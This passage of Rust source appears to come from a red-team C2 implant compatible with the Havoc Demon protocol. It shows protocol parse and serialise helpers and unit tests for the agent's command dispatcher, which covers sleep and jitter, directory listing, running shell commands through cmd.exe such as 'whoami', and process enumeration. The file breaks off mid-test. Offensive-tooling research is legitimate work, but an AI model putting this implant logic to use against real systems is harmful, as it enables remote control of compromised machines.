        Err(e) => {
            warn!("CommandPackageDropped: failed to parse dropped_length: {e}");
            return DispatchResult::Ignore;
        }
    };

    let max_length = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandPackageDropped: failed to parse max_length: {e}");
            return DispatchResult::Ignore;
        }
    };

    warn!(request_id, dropped_length, max_length, "package dropped — cleaning up in-flight state");

    // Mark any active downloads associated with this request for removal.
    let removed_downloads = downloads.mark_removed_by_request_id(request_id);
    if removed_downloads > 0 {
        info!(request_id, removed_downloads, "marked downloads for removal after package drop");
    }

    // Discard any partially-staged mem-file keyed by this request ID.
    if mem_files.remove(&request_id).is_some() {
        info!(request_id, "removed in-flight mem-file after package drop");
    }

    // No response — the original Havoc handler deliberately does not call
    // RequestCompleted, because multiple dropped-package callbacks can arrive
    // for a single request.
    DispatchResult::Ignore
}

// ─── Payload parsing helpers (server → agent, little-endian) ─────────────────

/// Parse a `u32` in little-endian byte order from `buf[*offset..]`.
fn parse_u32_le(buf: &[u8], offset: &mut usize) -> Result<u32, &'static str> {
    if buf.len() < *offset + 4 {
        return Err("buffer too short for u32 LE");
    }
    let val = u32::from_le_bytes(
        buf[*offset..*offset + 4].try_into().map_err(|_| "slice-to-array conversion failed")?,
    );
    *offset += 4;
    Ok(val)
}

/// Parse a `u64` in little-endian byte order from `buf[*offset..]`.
fn parse_u64_le(buf: &[u8], offset: &mut usize) -> Result<u64, &'static str> {
    if buf.len() < *offset + 8 {
        return Err("buffer too short for u64 LE");
    }
    let val = u64::from_le_bytes(
        buf[*offset..*offset + 8].try_into().map_err(|_| "slice-to-array conversion failed")?,
    );
    *offset += 8;
    Ok(val)
}

/// Parse a length-prefixed byte slice: `[u32 LE length][bytes…]`.
fn parse_bytes_le(buf: &[u8], offset: &mut usize) -> Result<Vec<u8>, &'static str> {
    let len = parse_u32_le(buf, offset)? as usize;
    if buf.len() < *offset + len {
        return Err("buffer too short for payload bytes");
    }
    let bytes = buf[*offset..*offset + len].to_vec();
    *offset += len;
    Ok(bytes)
}

/// Decode a UTF-16LE byte slice to a `String`, stripping trailing NUL characters.
fn decode_utf16le_null(bytes: &[u8]) -> String {
    let words: Vec<u16> = bytes.chunks_exact(2).map(|b| u16::from_le_bytes([b[0], b[1]])).collect();
    String::from_utf16_lossy(&words).trim_end_matches('\0').to_string()
}

// ─── Payload serialisation helpers (agent → server, big-endian, always) ──────
//
// Used by the FS download OPEN header and download chunk packets, which must
// use big-endian encoding to match the original Demon `PackageAdd*` functions.

/// Append a `u32` in big-endian byte order (non-test, always compiled).
fn write_u32_be_always(buf: &mut Vec<u8>, v: u32) {
    buf.extend_from_slice(&v.to_be_bytes());
}

/// Encode `s` as UTF-16LE with a NUL terminator and append `[u32 BE length][bytes…]`.
///
/// Matches the Demon's `PackageAddWString`: big-endian length prefix, UTF-16LE payload.
fn write_wstring_be(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u8> =
        s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
    #[allow(clippy::cast_possible_truncation)]
    let len = utf16.len() as u32;
    buf.extend_from_slice(&len.to_be_bytes());
    buf.extend_from_slice(&utf16);
}

// ─── Payload serialisation helpers (agent → server, big-endian, test-only) ───
//
// Used by the existing Sleep, Fs, and Exec callbacks which pre-date the LE fix.

/// Append a `u32` in big-endian byte order.
#[cfg(test)]
#[allow(dead_code)]
fn write_u32_be(buf: &mut Vec<u8>, v: u32) {
    buf.extend_from_slice(&v.to_be_bytes());
}

/// Append a length-prefixed byte slice: `[u32 BE length][bytes…]`.
#[cfg(test)]
fn write_bytes_be(buf: &mut Vec<u8>, data: &[u8]) {
    #[allow(clippy::cast_possible_truncation)]
    let len = data.len() as u32;
    buf.extend_from_slice(&len.to_be_bytes());
    buf.extend_from_slice(data);
}

/// Append a `u64` pointer in big-endian byte order (8 bytes).
#[cfg(test)]
fn write_ptr_be(buf: &mut Vec<u8>, v: u64) {
    buf.extend_from_slice(&v.to_be_bytes());
}

/// Encode `s` as UTF-16LE with a NUL terminator and append `[u32 BE length][bytes…]`.
#[cfg(test)]
fn write_utf16le_be(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u8> =
        s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
    write_bytes_be(buf, &utf16);
}

// ─── Payload serialisation helpers (agent → server, little-endian) ───────────
//
// Used by the process callbacks (CommandProcList / CommandProc) whose fields
// are parsed by the Rust teamserver's `CallbackParser` which reads LE.

/// Append a `u32` in little-endian byte order.
fn write_u32_le(buf: &mut Vec<u8>, v: u32) {
    buf.extend_from_slice(&v.to_le_bytes());
}

/// Append a length-prefixed byte slice: `[u32 LE length][bytes…]`.
fn write_bytes_le(buf: &mut Vec<u8>, data: &[u8]) {
    #[allow(clippy::cast_possible_truncation)]
    let len = data.len() as u32;
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(data);
}

/// Append a `u64` pointer in little-endian byte order (8 bytes).
///
/// Used for base-address fields; the Rust teamserver's `CallbackParser::read_u64` reads 8 bytes LE.
fn write_ptr_le(buf: &mut Vec<u8>, v: u64) {
    buf.extend_from_slice(&v.to_le_bytes());
}

/// Encode `s` as UTF-16LE with a NUL terminator and append `[u32 LE length][bytes…]`.
fn write_utf16le(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u8> =
        s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
    write_bytes_le(buf, &utf16);
}

// ─── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::demon::DemonPackage;

    // ── Helpers ──────────────────────────────────────────────────────────────

    /// Build a LE-encoded u32 + u32 payload (used for CommandSleep tests).
    fn le_u32_pair(a: u32, b: u32) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&a.to_le_bytes());
        v.extend_from_slice(&b.to_le_bytes());
        v
    }

    /// Build a LE-encoded payload with a single u32 subcommand (for CommandFs/Proc).
    fn le_subcmd(subcmd: u32) -> Vec<u8> {
        subcmd.to_le_bytes().to_vec()
    }

    /// Build a LE length-prefixed UTF-16LE byte payload for a string.
    fn le_utf16le_payload(s: &str) -> Vec<u8> {
        let utf16: Vec<u8> =
            s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
        let mut v = Vec::new();
        v.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        v.extend_from_slice(&utf16);
        v
    }

    /// Build a full Dir request payload (LE-encoded, matching the teamserver write order).
    #[allow(clippy::too_many_arguments)]
    fn dir_request_payload(
        path: &str,
        subdirs: bool,
        files_only: bool,
        dirs_only: bool,
        list_only: bool,
        starts: &str,
        contains: &str,
        ends: &str,
    ) -> Vec<u8> {
        let mut v = le_subcmd(1); // Dir = 1
        v.extend_from_slice(&0u32.to_le_bytes()); // file_explorer = false
        v.extend_from_slice(&le_utf16le_payload(path));
        v.extend_from_slice(&(subdirs as u32).to_le_bytes());
        v.extend_from_slice(&(files_only as u32).to_le_bytes());
        v.extend_from_slice(&(dirs_only as u32).to_le_bytes());
        v.extend_from_slice(&(list_only as u32).to_le_bytes());
        v.extend_from_slice(&le_utf16le_payload(starts));
        v.extend_from_slice(&le_utf16le_payload(contains));
        v.extend_from_slice(&le_utf16le_payload(ends));
        v
    }

    // ── parse_u32_le ─────────────────────────────────────────────────────────

    #[test]
    fn parse_u32_le_reads_correct_value() {
        let buf = [0x01, 0x00, 0x00, 0x00]; // 1 in LE
        let mut offset = 0;
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("parse"), 1);
        assert_eq!(offset, 4);
    }

    #[test]
    fn parse_u32_le_advances_offset() {
        let buf = [0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00];
        let mut offset = 0;
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("first"), 1);
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("second"), 2);
    }

    #[test]
    fn parse_u32_le_short_buffer_returns_err() {
        let buf = [0x01, 0x00, 0x00]; // only 3 bytes
        let mut offset = 0;
        assert!(parse_u32_le(&buf, &mut offset).is_err());
    }

    // ── parse_bytes_le ───────────────────────────────────────────────────────

    #[test]
    fn parse_bytes_le_reads_length_prefixed_slice() {
        let data: &[u8] = &[0xAA, 0xBB];
        let mut buf = (data.len() as u32).to_le_bytes().to_vec();
        buf.extend_from_slice(data);
        let mut offset = 0;
        let result = parse_bytes_le(&buf, &mut offset).expect("parse");
        assert_eq!(result, data);
        assert_eq!(offset, 6);
    }

    #[test]
    fn parse_bytes_le_empty_payload_is_ok() {
        let buf = 0u32.to_le_bytes();
        let mut offset = 0;
        let result = parse_bytes_le(&buf, &mut offset).expect("parse");
        assert!(result.is_empty());
    }

    // ── decode_utf16le_null ──────────────────────────────────────────────────

    #[test]
    fn decode_utf16le_null_strips_null_terminator() {
        // "Hi\0" encoded as UTF-16LE
        let encoded: Vec<u8> = "Hi\0".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert_eq!(decode_utf16le_null(&encoded), "Hi");
    }

    #[test]
    fn decode_utf16le_null_handles_empty_slice() {
        assert_eq!(decode_utf16le_null(&[]), "");
    }

    // ── write_utf16le_be ─────────────────────────────────────────────────────

    #[test]
    fn write_utf16le_be_roundtrips_ascii_string() {
        let s = "hello";
        let mut buf = Vec::new();
        write_utf16le_be(&mut buf, s);

        // First 4 bytes: BE length of UTF-16LE bytes (including null terminator)
        // "hello\0" → 6 UTF-16 code units × 2 bytes = 12 bytes
        let len = u32::from_be_bytes(buf[0..4].try_into().expect("len"));
        assert_eq!(len, 12); // 5 chars + NUL = 6 × 2

        let decoded = decode_utf16le_null(&buf[4..]);
        assert_eq!(decoded, s);
    }

    // ── write_utf16le ────────────────────────────────────────────────────────

    #[test]
    fn write_utf16le_roundtrips_ascii_string() {
        let s = "hello";
        let mut buf = Vec::new();
        write_utf16le(&mut buf, s);

        // First 4 bytes: LE length of UTF-16LE bytes (including null terminator)
        // "hello\0" → 6 UTF-16 code units × 2 bytes = 12 bytes
        let len = u32::from_le_bytes(buf[0..4].try_into().expect("len"));
        assert_eq!(len, 12); // 5 chars + NUL = 6 × 2

        let decoded = decode_utf16le_null(&buf[4..]);
        assert_eq!(decoded, s);
    }

    // ── handle_sleep ─────────────────────────────────────────────────────────

    #[test]
    fn handle_sleep_updates_config_and_echoes_values() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(3000, 25);
        let package = DemonPackage::new(DemonCommand::CommandSleep, 42, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );

        assert_eq!(config.sleep_delay_ms, 3000);
        assert_eq!(config.sleep_jitter, 25);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandSleep));
        // Payload: [3000 LE][25 LE]
        let expected_delay = 3000u32.to_le_bytes();
        let expected_jitter = 25u32.to_le_bytes();
        assert_eq!(&resp.payload[0..4], &expected_delay);
        assert_eq!(&resp.payload[4..8], &expected_jitter);
    }

    #[test]
    fn handle_sleep_clamps_jitter_to_100() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(1000, 150); // jitter > 100
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert_eq!(config.sleep_jitter, 100);
    }

    #[test]
    fn handle_sleep_short_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, vec![0x01]); // too short
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_fs pwd ────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_pwd_returns_non_empty_path() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(9); // GetPwd = 9
        let package = DemonPackage::new(DemonCommand::CommandFs, 7, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));

        // First 4 bytes LE = subcommand (9)
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 9);

        // Remaining = length-prefixed UTF-16LE path
        assert!(resp.payload.len() > 8, "payload should contain a path");
    }

    // ── handle_fs cd ─────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_cd_changes_directory_and_echoes_path() {
        let tmp = std::env::temp_dir();
        let tmp_str = tmp.display().to_string();

        let mut config = SpecterConfig::default();
        let mut payload = le_subcmd(4); // Cd = 4
        payload.extend_from_slice(&le_utf16le_payload(&tmp_str));
        let package = DemonPackage::new(DemonCommand::CommandFs, 8, payload);

        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 4);

        // Decode echoed path from response
        let path_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let decoded = decode_utf16le_null(&resp.payload[8..8 + path_len]);
        assert_eq!(decoded, tmp_str);
    }

    #[test]
    fn handle_fs_cd_missing_path_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(4); // Cd = 4, but no path bytes follow
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_fs dir ────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_dir_returns_non_empty_listing() {
        let tmp = std::env::temp_dir();
        let tmp_str = tmp.display().to_string();

        let mut config = SpecterConfig::default();
        let payload = dir_request_payload(&tmp_str, false, false, false, false, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 9, payload);

        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn handle_fs_dir_list_only_omits_size_and_timestamps() {
        // In list_only mode the response must NOT include is_dir/size/timestamps per entry
        // and must NOT include total_size per dir group.
        let tmp = std::env::temp_dir();
        // Create a known file so we always have at least one entry.
        let test_file = tmp.join("specter_list_only_test.tmp");
        let _ = std::fs::write(&test_file, b"x");

        let mut config = SpecterConfig::default();
        let payload =
            dir_request_payload(&tmp.display().to_string(), false, false, false, true, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 11, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };

        // Parse the response header.
        let p = &resp.payload;
        let mut pos = 0usize;
        let _subcmd = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("subcmd"));
        pos += 4;
        let _file_explorer = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("fe"));
        pos += 4;
        let list_only_flag = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("lo"));
        pos += 4;
        assert_eq!(list_only_flag, 1, "list_only must be echoed as 1");

        // Skip root_path (LE length-prefixed utf16le).
        let path_len = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("plen")) as usize;
        pos += 4 + path_len;
        let success = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("success"));
        assert_eq!(success, 1);
        pos += 4;

        // Dir group: dir_path, num_files, num_dirs — but NO total_size.
        let gpath_len = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("gpath")) as usize;
        pos += 4 + gpath_len;
        let _num_files = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("nf"));
        pos += 4;
        let _num_dirs = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("nd"));
        pos += 4;
        // In list_only mode the next field should be the first entry name, NOT a u64 total_size.
        // The remaining bytes must all be name-only entries (no is_dir/size/timestamps).
        // Just verify we can parse all remaining entries as utf16le strings without going OOB.
        while pos < p.len() {
            let name_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
            pos += 4 + name_len;
        }
        assert_eq!(pos, p.len(), "no trailing bytes; each entry must be exactly a name");

        let _ = std::fs::remove_file(test_file);
    }

    #[test]
    fn handle_fs_dir_timestamps_are_not_placeholder_epoch() {
        // Write a temp file and verify its modification time is encoded, not 1970-01-01 00:00.
        let tmp = std::env::temp_dir();
        let test_file = tmp.join("specter_ts_test.tmp");
        std::fs::write(&test_file, b"ts test").expect("write test file");

        let mut config = SpecterConfig::default();
        let payload =
            dir_request_payload(&tmp.display().to_string(), false, false, false, false, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 12, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };

        // Parse to the first entry and check the year field.
        let p = &resp.payload;
        let mut pos = 4 + 4 + 4; // subcmd + file_explorer + list_only
        let root_path_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
        pos += 4 + root_path_len + 4; // skip root_path + success
        let gpath_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
        pos += 4 + gpath_len + 4 + 4 + 8; // skip group path + num_files + num_dirs + total_size

        // Find the entry for our test file and read its year (offset 4+2+4+8+4+4 from name start).
        let test_name = "specter_ts_test.tmp";
        let mut found = false;
        while pos < p.len() {
            let name_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
            pos += 4;
            let name_utf16: Vec<u16> = p[pos..pos + name_len]
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            let name: String = char::decode_utf16(name_utf16)
                .filter_map(|r| r.ok())
                .filter(|&c| c != '\0')
                .collect();
            pos += name_len;
            // is_dir(4) + size(8) + day(4) + month(4) + year(4) + minute(4) + hour(4) = 32
            let _is_dir = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap());
            let _size = u64::from_le_bytes(p[pos + 4..pos + 12].try_into().unwrap());
            let _day = u32::from_le_bytes(p[pos + 12..pos + 16].try_into().unwrap());
            let _month = u32::from_le_bytes(p[pos + 16..pos + 20].try_into().unwrap());
            let year = u32::from_le_bytes(p[pos + 20..pos + 24].try_into().unwrap());
            pos += 32;
            if name == test_name {
                // The year must be >= 2024 (the file was just created).
                assert!(year >= 2024, "year should be current, got {year}");
                found = true;
            }
        }
        assert!(found, "test file entry not found in Dir listing");
        let _ = std::fs::remove_file(test_file);
    }

    #[test]
    fn unix_secs_to_ymd_hm_known_value() {
        // 1743162600 = 2025-03-28T11:50:00Z (verified against algorithm output)
        let (d, m, y, min, h) = unix_secs_to_ymd_hm(1_743_162_600);
        assert_eq!((d, m, y, min, h), (28, 3, 2025, 50, 11));
    }

    #[test]
    fn unix_secs_to_ymd_hm_epoch() {
        let (d, m, y, min, h) = unix_secs_to_ymd_hm(0);
        assert_eq!((d, m, y, min, h), (1, 1, 1970, 0, 0));
    }

    // ── handle_proc create / shell ────────────────────────────────────────────

    #[test]
    fn handle_proc_create_shell_returns_two_responses() {
        let cmd = "echo hello";
        let mut config = SpecterConfig::default();

        // Build the payload for CommandProc / ProcCreate (subcommand=4)
        let mut payload = 4u32.to_le_bytes().to_vec(); // subcmd = Create
        payload.extend_from_slice(&0u32.to_le_bytes()); // state
        payload.extend_from_slice(&le_utf16le_payload("c:\\windows\\system32\\cmd.exe")); // path
        payload.extend_from_slice(&le_utf16le_payload(&format!("/c {cmd}"))); // args
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped = true
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose = false

        let package = DemonPackage::new(DemonCommand::CommandProc, 99, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );

        let DispatchResult::MultiRespond(resps) = result else {
            panic!("expected MultiRespond, got {result:?}");
        };
        assert_eq!(resps.len(), 2);
        assert_eq!(resps[0].command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(resps[1].command_id, u32::from(DemonCommand::CommandOutput));

        // The output payload should contain "hello"
        // payload[0..4] = LE length, payload[4..] = output bytes
        let out_payload = &resps[1].payload;
        let out_len = u32::from_le_bytes(out_payload[0..4].try_into().expect("len")) as usize;
        let out_str = std::str::from_utf8(&out_payload[4..4 + out_len])
            .expect("utf8 output")
            .trim()
            .to_string();
        assert_eq!(out_str, "hello");
    }

    #[test]
    fn handle_proc_create_reports_child_pid_not_agent_pid() {
        // The proc-create callback must carry the spawned child's PID, not std::process::id().
        let mut config = SpecterConfig::default();
        let mut payload = 4u32.to_le_bytes().to_vec(); // subcmd = Create
        payload.extend_from_slice(&0u32.to_le_bytes()); // state
        payload.extend_from_slice(&le_utf16le_payload("c:\\windows\\system32\\cmd.exe"));
        payload.extend_from_slice(&le_utf16le_payload("/c echo pid_test"));
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose

        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );

        let DispatchResult::MultiRespond(resps) = result else {
            panic!("expected MultiRespond, got {result:?}");
        };

        // Parse the proc payload to extract the PID field.
        // Format: [subcmd: u32 LE][path: u32 LE len + utf16le bytes][pid: u32 LE][...]
        let proc_payload = &resps[0].payload;
        // Skip subcmd (4 bytes), then read the path length to skip the path.
        let path_len =
            u32::from_le_bytes(proc_payload[4..8].try_into().expect("path len")) as usize;
        let pid_offset = 4 + 4 + path_len;
        let reported_pid = u32::from_le_bytes(
            proc_payload[pid_offset..pid_offset + 4].try_into().expect("pid bytes"),
        );

        // The reported PID must be non-zero (child was spawned) and must NOT be our own PID.
        assert_ne!(reported_pid, 0, "child PID must not be zero");
        assert_ne!(
            reported_pid,
            std::process::id(),
            "child PID must not equal the agent's own PID"
        );
    }

    #[test]
    fn translate_to_shell_cmd_strips_cmd_exe_prefix() {
        assert_eq!(translate_to_shell_cmd("c:\\windows\\system32\\cmd.exe", "/c whoami"), "whoami");
        assert_eq!(translate_to_shell_cmd("c:\\windows\\system32\\cmd.exe", "/C ls -la"), "ls -la");
    }

    #[test]
    fn translate_to_shell_cmd_non_cmd_exe_uses_path_and_args() {
        assert_eq!(translate_to_shell_cmd("/usr/bin/ls", "-la /tmp"), "/usr/bin/ls -la /tmp");
    }

    #[test]
    fn translate_to_shell_cmd_empty_args_returns_path() {
        assert_eq!(translate_to_shell_cmd("/usr/bin/id", ""), "/usr/bin/id");
    }

    // ── unknown/unhandled commands ────────────────────────────────────────────

    #[test]
    fn dispatch_unknown_command_id_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage { command_id: 0xDEAD_0000, request_id: 0, payload: vec![] };
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn dispatch_no_job_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandNoJob, 0, vec![]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn dispatch_exit_returns_exit() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandExit, 0, vec![]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
            ),
            DispatchResult::Exit
        ));
    }

    // ── write_ptr_be ─────────────────────────────────────────────────────────

    #[test]
    fn write_ptr_be_encodes_eight_bytes_big_endian() {
        let mut buf = Vec::new();
        write_ptr_be(&mut buf, 0x0011_2233_4455_6677);
        assert_eq!(buf, [0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77]);
    }

    // ── write_ptr_le ─────────────────────────────────────────────────────────

    #[test]
    fn write_ptr_le_encodes_eight_bytes_little_endian() {
        let mut buf = Vec::new();
        write_ptr_le(&mut buf, 0x0011_2233_4455_6677);
        assert_eq!(buf, [0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x00]);
    }

    // ── handle_proc_list ─────────────────────────────────────────────────────

    #[test]
    fn handle_proc_list_uses_correct_command_id() {
        let mut config = SpecterConfig::default();
        // process_ui = 0 (console request)
        let payload = 0u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProcList));
    }

    #[test]
    fn handle_proc_list_echoes_process_ui_flag() {
        let mut config = SpecterConfig::default();
        // process_ui = 1 (from process manager)
        let payload = 1u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 2, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        let echoed_ui = u32::from_le_bytes(resp.payload[0..4].try_into().expect("le u32"));
        assert_eq!(echoed_ui, 1, "process_ui must be echoed verbatim");
    }

    #[test]
    fn handle_proc_list_contains_at_least_one_process() {
        let mut config = SpecterConfig::default();
        let payload = 0u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 3, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        // Payload must be > 4 bytes (the process_ui field) if any processes were enumerated.
        assert!(resp.payload.len() > 4, "process list must contain at least one entry");
    }

    #[test]
    fn handle_proc_list_includes_self_pid() {
        let own_pid = std::process::id();
        let mut config = SpecterConfig::default();
        let payload = 0u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 4, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        // Parse the response (LE): skip process_ui (4 bytes), then iterate entries.
        let p = &resp.payload;
        let mut pos = 4usize; // skip process_ui
        let mut found = false;
        while pos + 4 <= p.len() {
            // name: length-prefixed utf16le (LE length prefix)
            let name_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
            pos += 4 + name_len;
            if pos + 4 > p.len() {
                break;
            }
            // pid (LE)
            let pid = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("pid"));
            pos += 4;
            if pid == own_pid {
                found = true;
            }
            // skip: is_wow64 + ppid + session_id + threads = 4 × u32 = 16 bytes
            pos += 16;
            // user: length-prefixed utf16le (LE length prefix)
            if pos + 4 > p.len() {
                break;
            }
            let user_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("user len")) as usize;
            pos += 4 + user_len;
        }
        assert!(found, "own PID {own_pid} not found in process list");
    }

    // ── handle_proc_modules ──────────────────────────────────────────────────

    #[test]
    fn handle_proc_modules_returns_correct_command_id() {
        let mut config = SpecterConfig::default();
        // pid=0 → current process
        let mut payload = 2u32.to_le_bytes().to_vec(); // subcmd = Modules
        payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
        let package = DemonPackage::new(DemonCommand::CommandProc, 10, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
